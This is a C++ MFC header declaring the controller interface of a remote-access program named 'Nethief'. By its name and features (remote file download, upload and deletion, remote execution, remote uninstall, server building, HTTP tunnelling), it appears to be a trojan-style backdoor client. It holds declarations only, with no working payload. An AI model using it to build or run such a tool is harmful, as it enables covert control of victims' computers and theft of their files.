//Download by http://www.NewXing.com
// NethiefDoc.h : interface of the CNethiefDoc class
#include "MainFrm.h"
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_NETHIEFDOC_H__2DA6D10B_AC2D_11D4_89D9_2C4705C10000__INCLUDED_)
#define AFX_NETHIEFDOC_H__2DA6D10B_AC2D_11D4_89D9_2C4705C10000__INCLUDED_

#if _MSC_VER >= 1000
#pragma once
#endif // _MSC_VER >= 1000
//将所有的处理函数都放到CNethiefDoc里面,以方便处理

//*************************************
#pragma pack(1) //字节对齐

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strClientName;
	BOOL			bIsHttpTunnel;
}
NOTIFY_CLIENT_CONNECT_THREAD_PARAM,*pNOTIFY_CLIENT_CONNECT_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
}
EXPAND_DIRECTORY_THREAD_PARAM,*pEXPAND_DIRECTORY_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
}
SHOW_FILELIST_THREAD_PARAM,*pSHOW_FILELIST_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
	CString			strFilename1;
	CString			strFilename2;
}
RENAME_FILE_THREAD_PARAM,*pRENAME_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFullFilename;
}
NEW_FILE_THREAD_PARAM,*pNEW_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFullFilename;
}
NEW_FOLDER_THREAD_PARAM,*pNEW_FOLDER_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFrom;
}
DELETE_FILE_THREAD_PARAM,*pDELETE_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFrom;
	CString			strTo;
	DWORD			dwFOFlags;
}
REMOTE_PASTE_THREAD_PARAM,*pREMOTE_PASTE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFrom;
}
GET_OPERATION_OBJECT_THREAD_PARAM,*pGET_OPERATION_OBJECT_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename1;
	CString			strFilename2;
	DWORD			dwStartPosition;
	BOOL			bIsCut;
}
DOWNLOAD_FILE_THREAD_PARAM,*pDOWNLOAD_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename1;
	CString			strFilename2;
	DWORD			dwStartPosition;
	BOOL			bIsCut;
}
UPLOAD_FILE_THREAD_PARAM,*pUPLOAD_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strPath;
}
SHOW_PROPERTY_MULTI_THREAD_PARAM,*pSHOW_PROPERTY_MULTI_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
}
SHOW_PROPERTY_SINGLE_THREAD_PARAM,*pSHOW_PROPERTY_SINGLE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
	DWORD			dwFileAttributes;
}
MODIFY_PROPERTY_SINGLE_THREAD_PARAM,*pMODIFY_PROPERTY_SINGLE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strDiskDrive;
}
SHOW_PROPERTY_DISKDRIVE_THREAD_PARAM,*pSHOW_PROPERTY_DISKDRIVE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strDiskDrive;
	CString			strVolumeName;
}
MODIFY_PROPERTY_DISKDRIVE_THREAD_PARAM,*pMODIFY_PROPERTY_DISKDRIVE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
	CString			strParam;
	int				nShowCmd;
}
REMOTE_RUN_THREAD_PARAM,*pREMOTE_RUN_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
}
REMOTE_UNINSTALL_THREAD_PARAM,*pREMOTE_UNINSTALL_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFindDir;
	CString			strFindFile;
	BOOL			bSearchSubdir;
}
FIND_FILE_THREAD_PARAM,*pFIND_FILE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
}
SHOW_NOTE_THREAD_PARAM,*pSHOW_NOTE_THREAD_PARAM;

typedef struct
{
	CFileSocket*	pFileSocket;
	CString			strHostName;
	CString			strFilename;
}
GET_FILE_INFO_THREAD_PARAM,*pGET_FILE_INFO_THREAD_PARAM;

#pragma pack()	//使用缺省对齐
//*************************************
UINT NotifyClientConnectProc(LPVOID pParam);			//通知服务端开始连接
UINT Command_IDVerifyProc(LPVOID pParam);				//服务端身份验证
UINT Command_DownloadDiskDriveInfoProc(LPVOID pParam);	//下载服务端信息
UINT Command_ExpandDirectoryProc(LPVOID pParam);
UINT Command_ShowFileListProc(LPVOID pParam);
UINT Command_RenameFileProc(LPVOID pParam);
UINT Command_NewFileProc(LPVOID pParam);
UINT Command_NewFolderProc(LPVOID pParam);
UINT Command_DeleteFileProc(LPVOID pParam);
UINT Command_RemotePasteProc(LPVOID pParam);
UINT Command_GetOperationObjectProc(LPVOID pParam);
UINT Command_DownloadFileProc(LPVOID pParam);
UINT Command_UploadFileProc(LPVOID pParam);
UINT Command_ShowPropertyMultiProc(LPVOID pParam);
UINT Command_ShowPropertySingleProc(LPVOID pParam);
UINT Command_ModifyPropertySingleProc(LPVOID pParam);
UINT Command_ShowPropertyDiskdriveProc(LPVOID pParam);
UINT Command_ModifyPropertyDiskdriveProc(LPVOID pParam);
UINT Command_RemoteRunProc(LPVOID pParam);
UINT Command_RemoteUninstallProc(LPVOID pParam);
UINT Command_FindFileProc(LPVOID pParam);
UINT Command_ShowNoteProc(LPVOID pParam);
UINT Command_GetFileInfoProc(LPVOID pParam);

class CNethiefDoc : public CDocument
{
protected: // create from serialization only
	CNethiefDoc();
	DECLARE_DYNCREATE(CNethiefDoc)

// Attributes
public:
	//*****************************************************************
	////////////////////////成员变量/////////////////////////////
	CMainFrame*		m_pFrame;
	CMyTreeView*	m_pTreeView;
	CMyListView*	m_pListView;
	CTreeCtrl*		m_Tree;
	CListCtrl*		m_List;
	CStatusBar*		m_pStatusBar;//状态栏
//	CCommunity*		m_pCommunity;
	CFileSocket*	m_pFileSocket;

	CImageList		m_ListImageList;//列表映象列表(用于ListView)
	CImageList		m_TreeImageList;//树映象列表(用于TreeView)
	HICON			m_hIcon_Folder;//列表映象列表里常用的文件夹图标
	HICON			m_hIcon_UnknownFile;//列表映象列表里常用的未知文件图标

	CProgressCtrl	m_Progress;//状态栏进度条
	CStatic			m_Static_Offline;//状态栏离线状态
	CStatic			m_Static_Busy;
	HICON			m_hIcon_Offline;
	HICON			m_hIcon_Busy;
	BOOL			m_bIsBusy;

	DWORD			m_dwFOFlags;
	CString			m_strFOHostName;
	HTREEITEM		m_hCutParentItem;
	DWORD			m_dwNewClipboardFormat;
	DWORD			m_dwClipboardDataSize;

	CString			m_strIndicatorStatus;
	BOOL			m_bIsOnline;
	BOOL			m_bLogoning;
	BOOL			m_bFlashIcon;
	int				m_nCount;
	int				m_nCount2;
	int				m_nCount3;
	CString			m_strServerNum;
	/////////////////////////////////////////////
	CWinThread*		m_pFileSocketThread;

	///////////客户端设置变量////////////
	CString			m_strFileViewer;//用于查看文件的自定义程序
	////////////////////////成员函数/////////////////////////////
	void OnInitial();
	void OnClose();
	void OnTreeInitalUpdate();
	void OnListInitalUpdate();
	void OnListDestroy();
	//////////////////////////////////////////
	void AddDiskDriveToTree(HTREEITEM hItem);//添加磁盘驱动器到树
	BOOL AddDoubleDeckSubdirectoryToDiskDriveItem(CString strDir,HTREEITEM hItem);//添加双层子目录到磁盘驱动器节点
	void AddSubdirectoryToTree(CString strDir,HTREEITEM hItem);//添加子目录到树
	void AddFileToList(CString strDir);//添加文件列表到List
	void AddHost(CString strItemName,BOOL bIsHttpTunnel);
	////////////////////////////////////////////
	void OnTreeItemexpanding(NM_TREEVIEW* pNMTreeView,LRESULT* pResult);
	void OnTreeSelchanged(NM_TREEVIEW* pNMTreeView,LRESULT* pResult);
	void OnTreeBeginlabeledit(TV_DISPINFO* pTVDispInfo,LRESULT* pResult);
	void OnTreeEndlabeledit(TV_DISPINFO* pTVDispInfo,LRESULT* pResult);
	void OnListEndlabeledit(LV_DISPINFO* pDispInfo, LRESULT* pResult);
	void OnListDblclk(NM_LISTVIEW* pNMListView,LRESULT* pResult);
	///////////////////////////////////////////
	void ChangeDirectoryItem(CString strDirName,CString strNewDirName);
	void SelectDirecoryItem(CString strDirName);
	void RefreshDirecoryItem(HTREEITEM hSelectItem);
	void UnsignCutDirecoryItem(BOOL bIsTree);
	void SignCutDirecoryItem(CString strDirName);
	void AddDirecoryItem(CString strDirName,HTREEITEM hSelectItem,BOOL bIsRefresh=FALSE);
	void DeleteDirecoryItem(CString strDirName);
	int FindDirectory(CString strDirName);
	void FindNewDirectory(HTREEITEM hSelectItem);
	void DeleteCutDirecoryItem();
	///////////////////////////////////////////
	CString ConverDWORDToCString(DWORDLONG dwSize);
	DWORDLONG GetDiskSpace(CString strDiskDriver,BOOL bFreeSpace);
	static int CALLBACK CompareFunc(LPARAM lParam1, LPARAM lParam2,LPARAM lParamSort);

	void SetCurDir(CString strCurHostName,CString strCurDir);
	CString GetCurDir();
	CString GetCurPath();
	CString GetCurHostName();

	void MessageErrorBox(int nErrorCode,CString strSubject,CString strFilename);
	void OnUpdateIndicatorProgress(CCmdUI *pCmdUI);
	BOOL CopyPathToClipboard(BOOL bIsTree);
	void SetFileOperationPath(CString* pstrPath);
	void FolderStatistic(CString strFindDir,int* nFileCount,
							 int* nFolderCount,DWORD* dwTotalSize);
	void GetOperationObject(HTREEITEM hSelectItem,CString strHostName,
		CString strFrom,CString strPath2,DWORD dwFOFlags);
	void SearchFile_GetOperationObject(CString strFindDir,int nPathLen,
		CByteArray* pArrayBuffer);
	void SearchFile(CString strFindDir,CString strFindFile,BOOL bSearchSubdir,
		CStringArray* pStringArray);

	void SetIndicatorRect();
	void SetOfflineSign();
	void FlashIcon();

	void OnTimer(UINT nIDEvent);
	void SetBusyCursor(BOOL bBusy);
	void SetIndicatorStatus(CString strIndicatorStatus);
	CString	CharToCString(char* cText,UINT nSize);
	CString GetHostName(HTREEITEM hItem);
	BOOL FindHost(CString strHostName,BOOL bIsHttpTunnel);
	//////////////////////////////////////////////////
	void OnToolbarNewfile();
	void OnToolbarNewfolder();
	void OnToolbarBack();
	void OnToolbarRefresh();
	void OnToolbarFindfile();
	void OnToolbarCut(BOOL bIsTree);
	void OnToolbarCopy(BOOL bIsTree);
	void OnToolbarPaste();
	void OnMenuFileRun();
	void OnToolbarRun();
	void OnTreeMenuFileRename();
	void OnListMenuFileRename();
	void OnToolbarView();
	void OnTreeToolbarDelete();
	void OnListToolbarDelete();
	void OnToolbarProperty(BOOL bIsTree);
	void OnToolbarSelectall();
	void OnToolbarReverseselect();
	void OnMenuConsoleLogon();
	void OnHelpUpdate();
	void OnToolbarBuildserver();
	void OnToolbarDeletehost();
	void OnToolbarDisconnect();
	void OnMenuNetUninstall();
	void OnMenuNetNote();
	void OnToolbarStop();
	void OnMenuNetOption();
	void OnMenuNetDownload();
	//////////////////////////////////////////////////
	int GetINIfileInt(LPCTSTR lpSectionName,  //从INI中读取整型值
					  LPCTSTR lpKeyName);
	BOOL WriteINIfileInt(LPCTSTR lpSectionName, //向INI中写入整型值
						 LPCTSTR lpKeyName,
						 INT nValue);
	CString GetINIfileString(LPCTSTR lpSectionName, //从INI中读取字符值
							 LPCTSTR lpKeyName);
	BOOL WriteINIfileString(LPCTSTR lpSectionName,  //向INI中写入字符值
							LPCTSTR lpKeyName,
							LPCTSTR lpString);
	//////////////////////////////////////////////////
	void ConnectHost(HTREEITEM hExpandItem);
	void Remote_ExpandDirectory(HTREEITEM hExpandItem,CString strHostName,CString strPath);
	void Remote_ShowFileList(HTREEITEM hSelectItem,CString strHostName,CString strPath);
	void Remote_RenameFile(HTREEITEM hSelectItem,CString strHostName,
		CString strPath,CString strFilename1,CString strFilename2,
		BOOL bIsDir,BOOL bIsList,int nEditItem);
	void Remote_NewFile(HTREEITEM hSelectItem,CString strHostName,
		CString strPath,CString strFilename);
	void Remote_NewFolder(HTREEITEM hSelectItem,CString strHostName,
		CString strPath,CString strFilename);
	void Remote_DeleteFile(HTREEITEM hSelectItem,CString strHostName,
		CString strFrom,BOOL bIsList);
	void Remote_RemotePaste(CString strHostName,
		CString strFrom,CString strTo,DWORD dwFOFlags);
	void Remote_GetOperationObject(HTREEITEM hSelectItem,CString strHostName,
		CString strFrom,CString strPath2,DWORD dwFOFlags);
	void Remote_DownloadFile(CString strHostName,
		CString strFilename1,CString strFilename2,DWORD dwStartPosition,
		int nCurNum,int nTotalNum,BOOL bIsCut,int nControlCode);
	void Remote_UploadFile(CString strHostName,
		CString strFilename1,CString strFilename2,DWORD dwStartPosition,
		int nCurNum,int nTotalNum,BOOL bIsCut);
	void Remote_ShowProperty_Multi(CString strHostName,CString strPath);
	void Remote_ShowProperty_Single(CString strHostName,CString strFilename);
	void Remote_ModifyProperty_Single(CString strHostName,
		CString strFilename,DWORD dwFileAttributes);
	void Remote_ShowProperty_Diskdrive(HTREEITEM hSelectItem,
		CString strHostName,CString strDiskDrive);
	void Remote_ModifyProperty_Diskdrive(HTREEITEM hSelectItem,
		CString strHostName,CString strDiskDrive,CString strVolumeName);
	void Remote_RemoteRun(CString strHostName,
		CString strFilename,CString strParam,int nShowCmd);
	void Remote_RemoteUninstall(CString strHostName);
	void Remote_FindFile(CString strHostName,CString strFindDir,
		CString strFindFile,BOOL bSearchSubdir);
	void Remote_ShowNote(CString strHostName);
	void Remote_GetFileInfo(CString strHostName,
		CString strFilename,BOOL bIsDownloadFile);
	//////////////////////////////////////////////////
	void OnSocketAccept();
	void OnTM_NotifyConnect(DWORD dwResult);
	void OnTM_IDVerify(DWORD dwResult);
	void OnTM_DownloadDiskDriveInfo(DWORD dwResult);
	void OnTM_ExpandDirectory(DWORD dwResult);
	void OnTM_ShowFileList(DWORD dwResult);
	void OnTM_RenameFile(DWORD dwResult);
	void OnTM_NewFile(DWORD dwResult);
	void OnTM_NewFolder(DWORD dwResult);
	void OnTM_DeleteFile(DWORD dwResult);
	void OnTM_RemotePaste(DWORD dwResult);
	void OnTM_GetOperationObject(DWORD dwResult);
	void OnTM_DownloadFile(DWORD dwResult);
	void OnTM_UploadFile(DWORD dwResult);
	void OnTM_ShowProperty_Multi(DWORD dwResult);
	void OnTM_ShowProperty_Single(DWORD dwResult);
	void OnTM_ModifyProperty_Single(DWORD dwResult);
	void OnTM_ShowProperty_Diskdrive(DWORD dwResult);
	void OnTM_ModifyProperty_Diskdrive(DWORD dwResult);
	void OnTM_RemoteRun(DWORD dwResult);
	void OnTM_RemoteUninstall(DWORD dwResult);
	void OnTM_FindFile(DWORD dwResult);
	void OnTM_ShowNote(DWORD dwResult);
	void OnTM_RefreshStatusBar(DWORD dwResult);
	void OnTM_GetFileInfo(DWORD dwResult);
	//*****************************************************************
private:
	//*****************************************************************
	////////////////////////成员变量/////////////////////////////
	CString			m_strFileCacheDir;

	CString			m_strCurHostName;		//保存当前主机名
	CString			m_strCurDir;			//保存当前目录或路径
	CString			m_strExpandHostName;	//保存展开时的主机名
	CString			m_strExpandPath;		//保存展开时的路径

	HTREEITEM		m_hConnectHostItem;

	HTREEITEM		m_hExpandItem;			//保存展开的Item
	HTREEITEM		m_hSelectItem;			//保存选择的Item
	BOOL			m_bLastExpand;			//显示文件列表后展开
	CString			m_strIndicatorShowFileList;//文件列表的状态栏提示文字
	//用于OnTM_ExpandDirectory中////////
	BOOL			m_bLastSelect;			//展开后调用选择函数
	CString			m_strSelectName;		//被选中的子项名
	//用于OnTM_RenameFile中////////
	HTREEITEM		m_TM_RenameFile_hEditItem;
	CString			m_TM_RenameFile_strFullPath;
	CString			m_TM_RenameFile_strFilename2;
	int				m_TM_RenameFile_nEditItem;
	BOOL			m_TM_RenameFile_bIsDir;
	BOOL			m_TM_RenameFile_bIsList;
	//用于OnTM_NewFile中////////
	HTREEITEM		m_TM_NewFile_hSelectItem;
	CString			m_TM_NewFile_strFullPath;
	CString			m_TM_NewFile_strFilename;
	//用于OnTM_NewFolder中////////
	HTREEITEM		m_TM_NewFolder_hSelectItem;
	CString			m_TM_NewFolder_strFullPath;
	CString			m_TM_NewFolder_strFilename;
	//用于OnTM_DeleteFile中////////
	HTREEITEM		m_TM_DeleteFile_hSelectItem;
	CString			m_TM_DeleteFile_strFullPath;
	BOOL			m_TM_DeleteFile_bIsList;
	//用于OnTM_RemotePaste中////////
	CString			m_TM_RemotePaste_strFullPath;
	//用于OnTM_GetOperationObject中////////
	CString			m_TM_GetOperationObject_strRemoteHostName;
	HTREEITEM		m_TM_GetOperationObject_hSelectItem;
	CString			m_TM_GetOperationObject_strPath;
	CString			m_TM_GetOperationObject_strPath2;
	BOOL			m_TM_GetOperationObject_bIsCut;
	CString			m_TM_GetOperationObject_strFullPath;
	CStringArray	m_TM_GetOperationObject_StringArray;
	int				m_TM_GetOperationObject_nIndex;
	//用于OnTM_DownloadFile中////////
	CString			m_TM_DownloadFile_strFilename2;
	BOOL			m_TM_DownloadFile_bIsCut;
	int				m_TM_DownloadFile_nControlCode;
	//用于OnTM_UploadFile中////////
	BOOL			m_TM_UploadFile_bIsCut;
	//用于OnTM_ShowProperty_Multi中////////
	CString			m_TM_ShowPropertyMulti_strHostName;
	//用于OnTM_ShowProperty_Single中////////
	CString			m_TM_ShowPropertySingle_strHostName;
	CString			m_TM_ShowPropertySingle_strFilename;
	//用于OnTM_ShowProperty_Diskdrive中////////
	HTREEITEM		m_TM_ShowPropertyDiskdrive_hSelectItem;
	CString			m_TM_ShowPropertyDiskdrive_strHostName;
	CString			m_TM_ShowPropertyDiskdrive_strFullPath;
	//用于OnTM_ModifyProperty_Single中////////
	CString			m_TM_ModifyPropertySingle_strFullPath;
	//用于OnTM_ModifyProperty_Diskdrive中////////
	HTREEITEM		m_TM_ModifyPropertyDiskdrive_hSelectItem;
	CString			m_TM_ModifyPropertyDiskdrive_strVolumeName;
	CString			m_TM_ModifyPropertyDiskdrive_strFullPath;
	//用于OnTM_RemoteRun中////////
	CString			m_TM_RemoteRun_strFullPath;
	//用于OnTM_GetFileInfo中////////
	BOOL			m_TM_GetFileInfo_bIsDownloadFile;

	////////////////////////成员函数/////////////////////////////
	int ShowSelectFileOperationDialog(CString strFilename,//显示选择文件操作对话框
		HICON hSourceIcon,CString strSourceFileInfo,
		HICON hDestIcon,CString strDestFileInfo,
		BOOL bDoNotContinue);
	BOOL IsFileExist(CString strFilename);//查找指定文件是否存在
	//*****************************************************************


public:

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CNethiefDoc)
	public:
	virtual BOOL OnNewDocument();
	virtual void Serialize(CArchive& ar);
	//}}AFX_VIRTUAL

// Implementation
public:
	virtual ~CNethiefDoc();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:

// Generated message map functions
protected:
	//{{AFX_MSG(CNethiefDoc)
		// NOTE - the ClassWizard will add and remove member functions here.
		//    DO NOT EDIT what you see in these blocks of generated code !
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Developer Studio will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_NETHIEFDOC_H__2DA6D10B_AC2D_11D4_89D9_2C4705C10000__INCLUDED_)
